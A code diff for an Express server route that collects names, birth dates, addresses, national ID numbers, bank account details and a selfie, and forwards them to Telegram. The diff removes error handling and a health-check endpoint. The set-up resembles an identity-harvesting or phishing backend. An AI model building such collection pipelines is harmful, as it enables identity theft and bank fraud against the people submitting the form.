@@ -106,7 +106,6 @@ app.post('/api/data', upload.single('selfie'), async (req, res) => {
     console.log('Request body:', req.body);
     console.log('Request file:', req.file);
     
-    try {
         const { name, gender, dob, email, employ, phone, marital, city, state, address, lga, nin, bankName, accountNumber, accountName} = req.body;
         const selfieFile = req.file;
 
@@ -141,28 +140,6 @@ app.post('/api/data', upload.single('selfie'), async (req, res) => {
         const caption = `📸 Selfie from: ${name}`;
         await sendPhotoToTelegram(selfieFile.path, caption);
 
-        res.json({ 
-            success: true, 
-            message: 'Form submitted and data sent to Telegram successfully' 
-        });
-
-    } catch (error) {
-        console.error('Error processing form submission:', error);
-        res.status(500).json({ 
-            error: 'Failed to process form submission',
-            details: error.message 
-        });
-    }
-});
-
-// Health check endpoint
-app.get('/', (req, res) => {
-    res.json({ 
-        message: 'Form submission server is running',
-        endpoints: {
-            submitForm: 'POST /submit-form'
-        }
-    });
 });
 
 // Error handling middleware
